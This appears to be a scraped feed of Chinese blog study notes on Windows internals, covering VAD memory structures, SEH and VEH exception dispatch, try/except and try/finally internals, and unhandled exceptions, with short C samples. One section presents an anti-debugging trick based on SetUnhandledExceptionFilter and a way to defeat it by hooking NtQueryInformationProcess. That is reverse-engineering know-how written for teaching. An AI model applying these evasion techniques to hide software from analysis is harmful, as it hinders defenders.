LeftChild：左子树地址。 RightChild：右子树地址。 u：用于标识内存属性。 ControlArea：控制区域。 在知道左子树或右子树地址后，就可以通过 Code1kd> dt _MMVWAD 0x????????(左子树或右子树地址) 一层一层找到所有的节点，不过这样就略显麻烦了，因此Windbg提供了一个指令 Code1kd> !vad 0x????????(进程根节点地址) 通常运行该指令，就可以列出所指进程内线性地址的记录情况。 _CONTROL_AREA根据列出的二叉树的内容，除了Start、End这种前面介绍的用于描述线性地址区间的属性，还有Level记录了当前节点位于二叉树的层数（depth），还有一些属性会逐个进行介绍，这一部分，介绍Private/Mapped这一列。 在介绍MMVAD时，它内部有一个ControlArea成员，这个成员也是一个结构体，以根节点为例： 这里需要关注的是FilePointer字段，当这个值为空的时候，这块内存是private类型，也就是进程自己VirutalAlloc申请出来的内存。 如果FilePointer这个字段不为空，则这块内存是mapped类型，也就是说它映射了其它类型（dll, exe, nls等）的文件到内存中。此时FilePointer会指向一个_FILE_OBJECT文件对象结构，这个文件对象结构可以看到被映射文件的相关描述性信息。 _MMVAD_FLAGS_MMVAD中有一个成员u，其实指的是一个union共同体，这个共同体结构如下： c1234union { ULONG_PTR LongFlags; MMVAD_FLAGS VadFlags; //通常只使用这个成员}u; 尽管有两个成员，通常来说，只使用VadFlags这个成员。其结构如下： 这里主要介绍几个比较重要的字段： CommitCharge：最大可提供物理页的数目。 ImageMap：若值为1，则说明是映射（Mapped）了镜像文件（通常是.exe），若为0则不是。 Protection：表示当前_MMVAD节点描述的内存块的属性，取值如下： Code123//1:READONLY 2:EXECUTE 3:EXECUTE _READ //4:READWRITE 5:WRITECOPY 6:EXECUTE_READWRITE//7:EXECUTE_WRITECOPY 总结本篇，主要对用户空间的地址管理及其相关结构的进行简要介绍，部分结构的关系可以参考下图： 部分没有介绍到的，会在之后的篇章再作讨论。 参考资料参考书籍： 《Windows内核原理与实现》p243 —— 潘爱民 参考教程： 海哥逆向中级预习班课程 参考链接： https://blog.csdn.net/weixin_42052102/article/details/83722047 （My classmates-线性地址的管理学习笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"未处理异常","slug":"未处理异常","date":"2020-08-28T07:01:01.000Z","updated":"2022-05-17T15:28:51.656Z","comments":true,"path":"2020/08/28/未处理异常/","link":"","permalink":"http://cata1oc.github.io/2020/08/28/%E6%9C%AA%E5%A4%84%E7%90%86%E5%BC%82%E5%B8%B8/","excerpt":"","text":"前言根据前面学习的VEH，SEH，编译器对SEH的扩展等内容，我们对一个异常的处理过程了解更加深入，以用户异常为例，它进入0环后会交予KiDispatchException函数处理，该内核函数会对异常进行分发，若内核调试器与用户调试器都不存在或不处理，则会临时返回3环，交予3环的异常处理函数KiUserExceptionDispatcher进行处理。该函数会调用RtlDispatchException，先后去VEH链表与SEH链表查询可能存在的异常处理函数。那现在问题来了，如果VEH与SEH都没有对异常进行处理，那会怎么办？今天就来研究以下这个问题：未处理异常。 关于内核未处理异常对于内核态的未处理异常，如果内核调试器存在（例如Windbg），KiExceptionDispatch会给调试器第二轮处理机会（SEH不会，SEH仅在第一轮作处理）；如果调试器没有处理该异常或者根本没有内核调试器，KiExceptionDispatch会调用KeBugCheckEx启用蓝屏机制，其停止码为KMODE_EXCEPTION_NOT_HANDLED。 考虑到内核态未处理异常的机制比较简单，本篇将集中讨论用户态的未处理异常，内核态仅在此概括。 最后一道防线入口程序的最后一道防线 编写一个如下图所示的简单程序，下好断点，运行 这个程序咋一看非常简单，打开程序调用堆栈 会发现，当前所在的这个main函数，并不是函数的开始，它是由一个mainCRTStartup()调用而来的（这部分玩逆向的都知道，程序拖进OD时会发现入口并不在程序加载的位置），而且这个mainCRTStartup函数也不是最上层的，调用它的还有一个位于Kernel32.dll中的函数。 跟进到这个Kernel32.dll的函数 这时，我们用IDA搜索一个名为BaseProcessStart的函数，对比如下 可以看出来，这个最上层的函数，就是这个BaseProcessStart函数，是它调用了mainCRTStartup，再调用了主函数。那么了解这些有什么用呢？ 先别急，注意一点，BaseProcessStart的第三条指令，调用了一个_SEH_prolog，这个调用在我们之前分析的内核函数中经常见到，但全部都忽略了，这一次，我们要进入该函数一探究竟。 可以看到，_SEH_prolog函数有一个将SEH结构体挂到链表上的动作，可以认为，这个函数的作用就是将SEH挂到链表上。又因为这个函数被BaseProcessStart所调用，并且BaseProcessStart又是调用主函数的最上层的函数。 这样，如果main函数发生异常，且在它的SEH链表中未能查找到能够处理异常的异常处理函数。那么_except_handler3则会通过previousTryLevel查找最外层的异常处理函数，也就是BaseProcessStart函数帮忙挂上去的SEH结构中的异常处理函数。大部分情况下，这个异常处理函数会把异常处理掉。所以说，找不到异常处理程序的情况是不存在的。 线程启动的最后一道防线前面了解了，入口程序有最后一道防线，可以保证进程在一定能在SEH中找到异常处理函数。那么如果新起一个线程（拥有自己的堆栈），那么还会有最后一道防线吗？ 编译如下代码：（环境VC++6.0） c123456789101112131415161718#include \"stdafx.h\"#include DWORD WINAPI ThreadProc(LPVOID lpParam){ int x = 1; return 0;}int main(int argc, char* argv[]){ CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); getchar(); return 0;} 在我们定义的ThreadProc中没有定义任何异常处理的代码。 在int x=1处下断点，运行程序，观察调用堆栈。 发现，在线程竟然也不是从我们提供的函数开始执行的。 同样，打开IDA搜索一个名为BaseThreadStart的函数，与刚刚找到的上层函数进行对比。 发现，又是一样的，并且这个BaseThreadStart函数也调用了_SEH_prolog，也就意味着它也有最后一道防线。 UnhandledExceptionFilter结合上面所讲，无论进程还是线程，都拥有最后一道防线，即编译器会给我们加入一个异常处理的结构。其执行的伪代码如下： c123456789__try{}__except(UnhandledExceptionFilter(GetExceptionInformation()){ //终止线程 //终止进程} 这个伪代码最为关键的就是UnhandledExceptionFilter这个函数。当程序有异常发生时，若原先堆栈的SEH均未处理，那么这个函数一定会执行，因为_except括号内的过滤表达式一定会有一个值。UnhandledExceptionFilter的执行流程如下： 通过NtQueryInformationProcess查询当前进程是否正在被调试（判断EProcess+0xBC处的DebugPort），如果是，返回EXCEPTION_CONTINUE_SEARCH，此时会进入第二轮分发。 如果没有被调试： 查询是否通过SetUnhandledExceptionFilter注册顶层处理函数： 如果有，就调用。 如果无，则弹出窗口，让用户选择终止程序还是启动即时调试器。 如果用户没有启用即时调试器，那么该函数返回EXCEPTION_EXECUTE_HANDLER，也就意味着会执行_except内的代码，终止线程或进程。 顶层异常处理同普通异常处理有所区别：顶层异常处理存储在kernel32!BaseCurrentTopLevelFilter的全局变量中。 简单了解完UnhandledExceptionFilter函数后，可以对用户异常的处理有进一步的认识，通常情况下，用户异常不会进入第二轮分发，在第一轮分发时，若线程堆栈中的SEH未对异常进行处理，那么系统帮忙注册的最后一道防线会对异常进行处理（即终止进程/线程）；只有存在调试器的情况下，才会进入第二轮分发。 顶层异常处理函数 反调试与反反调试反调试前面提到，UnhandledExceptionFilter函数是通过NtQueryInformationProcess来查询当前进程是否在被调试的，若未被调试，程序则会判断是否通过SetUnhandledExceptionFilter注册了顶层函数。若注册了，则会调用这个顶层函数。 这样以来，也就有了一个反调试的手段，以如下程序为例： c1234567891011121314151617181920212223242526272829#include \"stdafx.h\"#include long _stdcall callback(_EXCEPTION_POINTERS* excp){ excp->ContextRecord->Ecx = 1; return EXCEPTION_CONTINUE_EXECUTION;}int main(int argc, char* argv[]){ //注册一个最顶层异常处理函数 SetUnhandledExceptionFilter(callback); //除0异常 _asm { xor edx,edx xor ecx,ecx mov eax,0x10 idiv ecx } //程序正常执行 printf(\"程序执行\"); getchar(); return 0;} 构造一个除0异常，然后将异常修复的代码通过SetUnhandledExceptionFilter注册为顶层的异常处理函数。这样，如果程序被调试，那么顶层的异常处理函数就得不到执行，程序就会报错退出，这样就达到了反调试的目的。这里注意一点，不要在VC++6.0编译器内运行程序，这样会报除零异常，进入该项目的文件夹，双击.exe文件，即程序能够正常执行；若拖入调试器中，则无法正常执行。实验效果可以参考调试与异常中的另一个例子。 反反调试有反调试就有反反调试，攻与防是相对的，由于UnhandledExceptionFilter函数是通过NtQueryInformationProcess来判断是否被调试的，而NtQueryInformationProcess是通过DebugPort的值来判断程序是否正在被调试，因而只需要Hook了NtQueryInformationProcess就可以针对上述的反调试手段实现反反调试。 二次分发这里再稍微提一下，就是这个KiUserExceptionDispatcher。它会调用RtlDispatchException，这个函数包括了对VEH的查找，SEH的查找，是否存在顶层函数，以及是否被调试，都在RtlDispatchException内部调用。全部都判断完了以后，返回一个Boolean值。 若为真，调用ZwContinue再进入0环 若为假，调用ZwRaiseException进行第二轮异常分发。 总结至此，关于异常的内容就结束了。主要是用户与内核两类异常的处理流程。用户的稍微复杂一些，最后还有一个未处理异常。现在回头再看第一篇贴的那张图，就好理解很多了。 参考资料参考书籍： 《软件调试 卷2：Windows平台调试》p265~p282 —— 张银奎 参考教程： 海哥逆向中级班预习班 参考链接： https://blog.csdn.net/weixin_42052102/article/details/83592391 （My classmates-未处理异常学习笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"局部展开与全局展开","slug":"局部展开与全局展开","date":"2020-08-27T09:27:22.000Z","updated":"2022-05-17T15:28:22.261Z","comments":true,"path":"2020/08/27/局部展开与全局展开/","link":"","permalink":"http://cata1oc.github.io/2020/08/27/%E5%B1%80%E9%83%A8%E5%B1%95%E5%BC%80%E4%B8%8E%E5%85%A8%E5%B1%80%E5%B1%95%E5%BC%80/","excerpt":"","text":"前言前一篇学习了try_except块的实现过程，了解了编译器是如何将多个try_except块的内容集中在一个SEH块上的，以及异常发生时_except_handler3函数是如何找到对应的异常处理函数的。本篇将学习在编译器扩展SEH基础上的另一个格式：try_finally块。 _try_finally格式c123456_try{ //可能出错的代码}_finally{ //一定要执行的代码} 特点正如注释所示，try_finally块的特点就是在finally块里的代码一定会得到执行。 观察上图，无论使用continue，break这样的控制语句，还是return这样的返回语句，亦或是触发异常，finally块内的语句始终会被执行。正如同前一篇分析讨论try_except的实现细节一样，本篇也将从反汇编的角度，分析try_finally的实现细节。 局部展开scopetable以return为例，观察反汇编，看程序是如何在return执行语句的控制下，仍然执行了finally语句块的内容。 c123456789101112131415161718192021#include \"stdafx.h\"#include void test(){ _try{ return; printf(\"其它代码\\n\"); } _finally{ printf(\"一定会执行的代码\\n\"); }}int main(){ test(); getchar(); return 0;} 在test()函数处下断点，编译并执行函数（环境Visual C++6.0） 由图，根据scopetable指向的地址，会发现它指向的结构体与try_except时不太一样。因为try_finally没有过滤表达式，因此第二个成员的值是空的。再看第三个成员，指向finally块内程序的地址。这下我们就知道finally块内的语句从哪里可以找到。那么问题来了，编译器是如何保证在return掉程序之前，执行finally块内的语句的呢？ _local_unwind2 继续观察反汇编，注意到，在执行return语句之前，调用了一个名为_local_unwind2的函数。这里需要说明一点，为什么这个过程被称作局部展开，原因就是在于这个函数翻译成中文就是局部展开的意思，没有别的含义。这地方很容易产生误解，局部展开不是一种技术，就是一个函数名而已。 进入_local_unwind2函数，继续分析 注意最后一行，_local_unwind2调用了一个地址，单步到这条指令，根据寄存器内的值，可以很容易的算出，这个地址（看前一张图），刚好就是finally块内语句的地址。也就是说，local_unwind2函数的作用就是执行finally块内的语句。又因为这个local_unwind2会在return执行前被调用（break, continue, 异常同理），因此finally块内的语句一定会被执行。 全局展开有局部，就会有全局，就像SEH与VEH一样。那什么是全局展开呢？查看下面一种情况： c12345678910111213141516171819202122232425262728293031323334353637#include \"stdafx.h\"#include void test(){ _try { _try { _try { *(int*)0 = 10; } _finally { printf(\"一定会执行的代码A\\n\"); } } _finally { printf(\"一定会执行的代码B\\n\"); } } _except(1) { printf(\"异常处理函数\\n\"); }}int main(){ test(); getchar(); return 0;} 在前面学习了并了解了try_except的本质后，以_except_handler3执行的角度来看这段代码：异常发生在最内层的try块中，此时except_handler3函数会根据当前trylevel的值找到对应的结构体并寻找异常处理函数，这时发现，结构体的第二个成员的值为空，说明这是一个finally块，不会处理异常，因此它将根据当前结构体的previousTryLevel的值，去找中间一层的try块对应的结构体。同样，在中间一层的try块中也没找到异常处理函数，这时它就会去最外层的try块中找，这时，找到了。 按照之前了解的_except_handler3的执行流程，由于过滤表达式的值为1，因此会执行except内的代码，那么一旦执行完except的代码，程序将退出try块，那么问题来了，内层try块的语句，不就得不到执行了吗？ 可以看到，finally块内的语句都得到了执行，接下来，跟进汇编，看看编译器的如何做到的。在_except(1)处下断，运行程序： 在执行完过滤表达式的语句后，可以单步到这里。发现，在这里调用了一个global_unwind2（全局展开）函数，并且接下来也调用了2次local_unwind2，这些都发生在执行except块的代码之前。这样就好理解了，当_except_handler3函数发现except内的过滤表达式值为1时，它会先执行global_unwind2，global_unwind2会从触发异常的那个try开始，依次调用局部展开，这样就可以保证finally块语句一定会得到执行。 参考资料参考书籍： 软件调试 卷2：Windows平台调试》p250~p252 —— 张银奎 参考教程： 海哥逆向中级班预习班 参考链接： https://blog.csdn.net/weixin_42052102/article/details/83551306 （My classmates-try_finally学习笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"_try_except本质","slug":"tryexcept本质","date":"2020-08-25T15:05:48.000Z","updated":"2022-05-17T15:27:13.687Z","comments":true,"path":"2020/08/25/tryexcept本质/","link":"","permalink":"http://cata1oc.github.io/2020/08/25/tryexcept%E6%9C%AC%E8%B4%A8/","excerpt":"","text":"前言前一篇学习了，Windows平台的编译器了扩展了SEH，通过try_except块简化了挂入SEH的过程。本篇就来研究一下编译器是如何通过try_except将异常挂入SEH链表的。本篇依旧在Windows XP系统下的Visual C++6.0编译器上进行实验。 _try_except实现细节手动挂入首先我们来回顾一下手动挂入链表的过程： 由图，手动挂入链表需要自身SEH结构的地址赋值给FS:[0]的位置，这样相当于把自己挂到链表首位。当然，还需要将自己的next指针指向原先FS:[0]处所指向的地址，这里没有显示出。 自动挂入以如下代码为例： c12345678910111213141516171819#include \"stdafx.h\"#include void TestException(){ _try{ } _except(1){ }}int main(int argc, char* argv[]){ TestException(); //下断点 getchar(); return 0;} 在TestException处下断点，观察反汇编。 可以看到，_try_except实际上的操作过程与手动挂入链表类似，同样是让FS:[0]指向新的链表头。接下来，我们来看另一种场景。 _try_except嵌套重复修改TestException如下： c1234567891011121314151617181920212223242526void TestException(){ _try { _try { } _except(1) { } } _except(1) { } _try { } _except(1) { }} 编译，下断点，观察反汇编 会神奇的发现，在try_except嵌套与重复的情况下（递归不包括，因为递归属于重复调用函数，会挂入多个SEH），经过编译器汇编后，仍然只有一个异常处理函数_except_handler3（该函数不同编译器不一样，此实验环境为VC6.0），并且只挂入了一次SEH。这是什么原因呢？ 原来编译器扩展了SEH结构体，在原先Windows要求下，SEH结构体至少要包含2个字段（Next：指向下一个SEH块，Handler：异常处理函数），其堆栈结构如下所示： 但是经过扩展后的SEH结构体原型如下（稍后会分析该结构体）： c1234567struct _EXCEPTION_REGISTRATION{ struct _EXCEPTION_REGISTRATION *prev; void (*handler)(PEXCEPTION_RECORD, PEXCEPTION_REGISTRATION, PCONTEXT, PEXCEPTION_RECORD); struct scopetable_entry *scopetable; int trylevel; int _ebp; }; 这样一来，堆栈的结构也就发生了变化，也就可以对应上之前分析的汇编代码。 接下来，研究该结构体的额外字段的作用，便可了解编译器是如何通过只挂一个SEH实现所有嵌套重复try_except块的功能。 扩展的_EXCEPTION_REGISTRATION结构体再来看_EXCEPTION_REGISTRATION这个结构： c1234567struct _EXCEPTION_REGISTRATION{ struct _EXCEPTION_REGISTRATION *prev; void (*handler)(PEXCEPTION_RECORD, PEXCEPTION_REGISTRATION, PCONTEXT, PEXCEPTION_RECORD); struct scopetable_entry *scopetable; int trylevel; int _ebp; }; 它多出了3个成员，其中最为重要的是scopetable和trylevel这两个字段，先来看scopetable。 ScopeTablescopetable是一个指针，它指向一个结构体数组，结构体如下： c123456struct scopetable_entry{ DWORD previousTryLevel //上一个try{}结构编号 PDWRD lpfnFilter //过滤函数的起始地址 PDWRD lpfnHandler //异常处理程序的地址 } 这三个成员的含义如何理解呢？根据注释，知道它是两个指针以及1个编号。下面用一个程序理清他们的作用。 编译运行如下代码（环境VC++6.0），并在a函数调用处设下断点。 c123456789101112131415161718192021222324252627282930313233343536373839404142#include \"stdafx.h\"#include int ExceptionFilter(){ return EXCEPTION_CONTINUE_EXECUTION;}void a(){ _try { //异常点A } _except(EXCEPTION_EXECUTE_HANDLER) { printf(\"异常处理函数A\\n\"); } _try { //异常点B _try { //异常点C } _except(GetExceptionCode() == 0xC0000094 ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) { printf(\"异常处理函数C \\n\"); } } _except(ExceptionFilter()) { printf(\"异常处理函数B\\n\"); }}int main(){ a();} 进入反汇编，根据_EXCEPTION_REGISTRATION结构的位置，找到scopetable的值，并在内存中定位到scopetable指向的结构体数组地址，如下图所示： 将数组中各结构体的成员标出后如下图： 这样来看，lpfnFilter与lpfnHandler的作用就清晰了很多： lpfnFilter：指向except括号内的内容，在前一篇文章中提到过滤表达式，也就是except括号内常量值，这里编译器将其优化成了一段可以返回的代码（注意ret指令），所以当异常发生时，代码已经不是顺序执行的了，而是会经过多次跳转和返回。 lpfnHandler：指向异常处理函数，这就相当于默认SEH结构的Handler的值。 综上，可以看出，之所以经过编译器扩展后仅有一个SEH块，原因是编译器通过对SEH块进行扩展，将每一个try_except块对应的过滤表达式与异常处理函数放到了scopetable指向的结构体数组中。这样就能在一个SEH块中容纳下多个try_except。 前面提到了scopetable中的两个指针成员lpfnFilter与lpfnHandler，还有一个成员previousTryLevel还未提。这个成员有什么用呢？再回顾一下，这3个try_except块对应的previousTryLevel的值 结合之前的一张图，可以看出两个值为-1的previousTryLevel对应两个外层的try_except块，值为1的previousTryLevel则对应内嵌在第二个try_except中的try_except块。这样就能理解了，previousTryLevel指的是当前try_except块所在的外层try_except块的下标是多少。例如前两个try_except块，它们的外层已经没有try_except块了，因此值为-1。内嵌的try_except块，位于第二个try_except块中，这里说的第二个的意思就是在scopetable指向的结构体数组中位于第二个，也就是下标为1。因此内嵌的try_except的previousTryLevel的值为1。 TryLevel理解了scopetable及其指向的结构体内的字段后，trylevel也就好理解了。它指的是当前代码执行到哪个try_except块了。如何理解呢？来看下面代码： c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include \"stdafx.h\"#include int ExceptionFilter(){ return 1;}void a(){ _try { _try { } _except(EXCEPTION_EXECUTE_HANDLER) { printf(\"异常处理函数\\n\"); } } _except(EXCEPTION_EXECUTE_HANDLER) { printf(\"异常处理函数\\n\"); } _try { _try { } _except(GetExceptionCode() == 0xC0000094 ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) { printf(\"异常处理函数\\n\"); } } _except(ExceptionFilter()) { printf(\"异常处理函数\\n\"); }}int main(){ a();} 同样在调用函数a处下断点，并进入反汇编。 可以看到，在初始化SEH结构体时，trylevel的值被设置为-1，位于[ebp-4]的位置。 观察这几处trylevel值的变化，它在进入第一个try_except块时，被设置为0（该try_except块对应的结构体位于scopetable[0]），在进入第二个try_except块时，又被设置成了1，一旦离开第二个try_except块，回到第一个try_except块所在空间时，又被设置成了0，等到了离开第一个try_except块时，被设置成了-1。 同样，在执行到另外几个try_except块时，trylevel也会被设置成该try_except块位于scopetable指向的结构体数组中的下标。所以可以看出，trylevel的作用，就是用来表明，当前程序位于哪个try_except块中，若不位于try_except块中，则设置为-1。 ebpebp就是ebp，可以认为是寻址用的，例如[ebp-4]就是trylevel的值。 _except_handler3执行过程至此，已经基本上了解一个异常处理的完整流程，这里就简单的回顾一遍这个过程。这里以用户触发除零异常为例： CPU检测到异常 查询IDT表，执行中断处理函数 CommonDispatchException KiDispatchException KiDebugRoutine（判断内核调试器） DbgkForwardException（判断用户调试器） KiUserExceptionDispatcher RtlDispatchException（3环） VEH SEH 执行_except_handler3函数 根据trylevel选择scopetable数组中的结构体 调用scopetable数组中对应结构体的lpfnFilter EXCEPTION_EXECUTE_HANDLER(1) 执行except代码 EXCEPTION_CONTINUE_SEARCH(0) 寻找下一个 EXCEPTION_CONTINUE_EXECUTION(-1) 重新执行 如果lpfnFilter函数返回0，则向上遍历，直到previousTryLevel为-1 参考资料参考书籍： 《软件调试 卷2：Windows平台调试》p249~p259 —— 张银奎 参考教程： 海哥逆向中级班预习班 参考链接： https://blog.csdn.net/qq_38474570/article/details/104346489 （鬼手56-编译器扩展SEH学习笔记） https://blog.csdn.net/weixin_42052102/article/details/83551306 （My classmates-编译器扩展SEH学习笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"编译器扩展SEH","slug":"编译器扩展SEH","date":"2020-08-24T02:21:33.000Z","updated":"2022-05-17T15:26:29.309Z","comments":true,"path":"2020/08/24/编译器扩展SEH/","link":"","permalink":"http://cata1oc.github.io/2020/08/24/%E7%BC%96%E8%AF%91%E5%99%A8%E6%89%A9%E5%B1%95SEH/","excerpt":"","text":"前言前面学习了VEH以及SEH，相较于全局链表的VEH，局部链表SEH有一个特别不方便的一点是，需要手动构造SEH结构体，并手动将其挂入SEH链表中，过程较为繁琐。本篇学习的编译器扩展SEH，就是在SEH的基础上，通过编译器的支持，简化了构造SEH结构体以及将其挂入链表的步骤。 需要注意一点，SEH以及VEH机制都是Windows系统下的异常处理机制，其它操作系统对于异常的处理方式并不一定相同，因此这里谈到的SEH扩展，主要是Windows平台相关编程语言主打的编译器对SEH功能的适配和优化。 编译器对SEH的支持首先来回顾一下，原先挂一个SEH到链表上的步骤是怎样的。 再来看看编译器扩展SEH后是如何实现的，以Visual C++ 6.0为例（本篇均以此编译器为例） 可以看到，简化了非常多，关键字try形成了一个区块，只需要将可能出现异常的代码放入这个try块里，编译器会替我们将异常处理程序嵌入到SEH结构体中，并将其挂入局部SEH链表内。 过滤表达式except使用过滤表达式来判断当前异常处理程序是否可以处理该异常。 取值except里的过滤表达式，只能是以下3个值中的一个： EXCEPTION_EXECUTE_HANDLER(1)：执行except中的异常处理代码 。 EXCEPTION_CONTINUE_SEARCH(0)：寻找下一个异常处理函数。 EXCEPTION_CONTINUE_EXECUTION(-1)：返回至异常错误处并重新执行。 形式过滤表达式有3种写法： 直接写常量值：这个比较好理解，就是填过滤表达式取值中的一个。 表达式： c12345678910111213141516_try{ _asm { xor edx,edx xor ecx,ecx mov eax,10 idiv ecx //EDX = (EAX/ECX)取余 }}//如果异常码为0xC0000094返回1否则返回0_except(GetExceptionCode() == 0xC0000094 ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH){ printf(\"如果出现异常 此处处理\\n\");} 表达式的写法相较于常量值，就是换了一种形式，它并没有做处理，但是多了逻辑判断。 调用函数写法： c12345678910111213141516171819202122232425262728//参数根据需要来写,可以不要参数int ExceptFilter(LPEXCEPTION_POINTERS pExceptionInfo){ pExceptionInfo->ContextRecord->Ecx = 1; //异常处理 return EXCEPTION_CONTINUE_EXECUTION; //返回出错位置重新执行}int main(){ _try { _asm { xor edx,edx xor ecx,ecx mov eax,10 idiv ecx //EDX = (EAX/ECX)取余 } } //GetExceptionInformation获取异常结构指针 _except(ExceptFilter(GetExceptionInformation())) { printf(\"如果出现异常 此处处理\\n\"); } getchar();} 调用函数的方式，和前一篇手动挂入SEH链表处理异常的方式比较类似，过滤表达式的值其实就是异常处理函数的返回值，因此采用调用函数的方式，就相当于编写SEH的handler。那么问题来了，在采用调用函数的写法下，已经有异常处理函数了，那么except内部的处理会执行吗？ 这要取决于异常处理函数的返回值了，也就是过滤表达式的取值。以上面的代码为例，由于返回值是EXCEPTION_CONTINUE_EXECUTION，所以异常处理函数执行完后，会回到异常处执行，这时由于修改了Ecx的值，因此再次执行时不会发生异常，也就不会再跳转到except处执行了。 那么问题又来了，既然异常处理函数已经实现了功能，为什么还要有except区块呢？ 其实这里的关键在于GetExceptionInformation函数，调用它可以获取到异常结构的指针，从而获取到异常发生时记录的信息以及上下文环境，若没有异常处理函数，那么在except函数内部也可以调用GetExceptionInformation获取到相关的参数，从而对异常进行处理。同样，如果异常处理函数的返回值为EXCEPTION_CONTINUE_HANDLER，则会在异常函数处理完之后，跳转到except块中执行。大部分情况下，使用except块进行处理异常是足够的，它可以让3环程序员打印出必要的信息，起到调试的作用，并不会像异常处理函数那样，修改真正的寄存器的值，使得程序重新执行。也因此，大部分表达式的值，最终都是1，这样就直接进入except执行。 参考资料参考书籍： 《软件调试 卷2：Windows平台调试》p249~p259 —— 张银奎 参考教程： 海哥逆向中级班预习班 参考链接： https://blog.csdn.net/qq_38474570/article/details/104346489 （鬼手56-编译器扩展SEH学习笔记） https://blog.csdn.net/weixin_42052102/article/details/83551306 （My classmates-编译器扩展SEH学习笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"SEH","slug":"SEH","date":"2020-08-23T02:46:37.000Z","updated":"2022-05-17T15:25:40.329Z","comments":true,"path":"2020/08/23/SEH/","link":"","permalink":"http://cata1oc.github.io/2020/08/23/SEH/","excerpt":"","text":"前言在学习了用户异常的分发后了解到KiUserExceptionDispatcher会调用RtlDispatchException函数来查找并调用异常处理函数，类似的内核异常处理时也会调用0环的RtlDispatchException函数来查找处理函数。 上一篇在学习VEH时比对过两者的差异，即处理用户异常时会先查找VEH，再查找SEH；而处理内核异常仅查找SEH。VEH在前一篇已经分析过，本篇就来学习一下SEH。 ExceptionListfs:[0] 在学习内核异常的分发时，已经了解过异常链表（也就是SEH）的存在，在内核通过FS:[0]可以找到链表头，并通过Next指针依次找到下一个异常处理函数。那么处理用户异常时，是如何找到ExceptionList（异常链表）的呢？ 由图，0环的FS:[0]指向KPCR，3环的FS:[0]指向TEB，观察图中TEB结构，可以发现，TEB的第一个成员也是NtTib，又NtTib的第一个成员就是ExceptionList，所以在3环时，也是通过FS:[0]找到异常链表的。 SEH结构SEH，即结构化异常处理（Structured Exception Handling），异常链表中的每个SEH都有一个结构。其结构可如下： c123456//SEH结构体typedef struct _EXCEPTION_REGISTRATION_RECORD { struct _EXCEPTION_REGISTRATION_RECORD* Next; //下一个节点，-1就是没有下一个节点了 PEXCEPTION_ROUTINE Handler; //指向异常处理函数} EXCEPTION_REGISTRATION_RECORD; 在堆栈中将这些SEH链接在一起就构建出一个如文章开头图片所示的异常链表。需要注意的是，SEH结构体是可扩展的，例如在前一篇学习VEH时，当调用AddVectoredExceptionHandler将VEH添加进全局链表时，可以看到VEH结构体有3个字段，比SEH多出一个prev字段，它用来指向前一个VEH。 c123456//VEH结构体typedef struct _VEH_REGISTRATION{ _VEH_REGISTRATION* next; _VEH_REGISTRATION* prev; PVECTORED_EXCEPTION_HANDLER pfnVeh;}VEH_REGISTRATION, *PVEH_REGISTRATION; SEH添加在VEH一篇中学习过VEH的添加，仅仅需要定义VEH的异常处理函数，然后调用AddVectoredExceptionHandler就可以将VEH添加进全局链表，在调用AddVectoredExceptionHandler时会自动构建VEH结构。 SEH则有所不同，VEH是全局链表，微软提供了相应的API函数；而SEH是局部链表，需要自己手动插入，首先需要定义一个SEH结构体（至少要有两个成员，next和Handler），然后定义SEH异常处理函数，其原型如下： c1234567EXCEPTION_DISPOSITION _cdecl MyEexception_handler( struct _EXCEPTION_RECORD *ExceptionRecord, //异常记录结构体 PVOID EstablisherFrame, //SEH结构体地址 struct _CONTEXT *ContextRecord, //存储异常发生时的上下文环境 PVOID DispatcherContext) 函数内部实现处理相应异常的功能，之后让SEH结构体的handler指向该异常处理函数。这样，SEH结构体就构造完成了。 接下来，就需要将SEH插入到ExceptionList中，ExceptionList的链表头位于FS:[0]的位置，相当于第一个SEH结构体的首地址，获取这个地址，令新的SEH结构体的next指向这个地址，并修改FS:[0]指向的地址为当前SEH块的地址，这样，就相当于把新构建的SEH插入到了异常链表的首位，完成了SEH添加，具体的操作方法会在后面的代码示出。 RtlDispatchException在处理用户异常时，3环的RtlDispatchException会先查找VEH，再去查找SEH。前一篇分析过会调用函数RtlCallVectoredExceptionHandlers来遍历VEH链表，寻找对应的异常处理函数。本篇来看看它是如何实现查找SEH链表的。 RtlpGetStackLimits 首先来看这个函数，调用它获取了FS:[8]和FS:[4]的值。先来看看这两个值分别是什么。 可以看出，调用该函数目的是为了获取StackBase以及StackLimit的值，这两个字段在线程切换时我们经常见到，用来描述一个线程栈空间的大小。 这么做的目的是，SEH链表必须位于线程的栈空间，因此不能超出这两个值的范围。从而调用该函数用来检测SEH链表是否位于线程的堆栈中。 RtlpGetRegistrationHead 这里和内核异常处理时一样，用来获取SEH链表头，只不过内核处理时查找链表头的流程为： FS:[0] -> KPCR -> NtTib -> ExceptionList 用户异常时流程为： FS:[0] -> TEB -> NtTib -> ExceptionList 查找的都是FS:[0]，但是0环与3环对应的结构不同，最终都能查到当前线程堆栈的SEH链表头。 验证与执行 再往下，先调用了RtlIsValidHandler函数，用来验证异常处理函数是否有效。再调用RtlpExecuteHandlerForException函数，执行异常处理函数。 SEH实验至此，通过观察3环RtlDispatchException函数的执行流程，了解了用户异常查找SEH链表并调用异常处理函数的过程。这里进行一个小实验，与VEH的实验一样，构造一个SEH，将其插入SEH链表，并触发异常调用自己构造的SEH的异常处理函数。不太一样的时候，SEH需要手动构造一个结构，并需要手动将SEH插入链表中。代码如下： c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include \"stdafx.h\"#include //最原始的 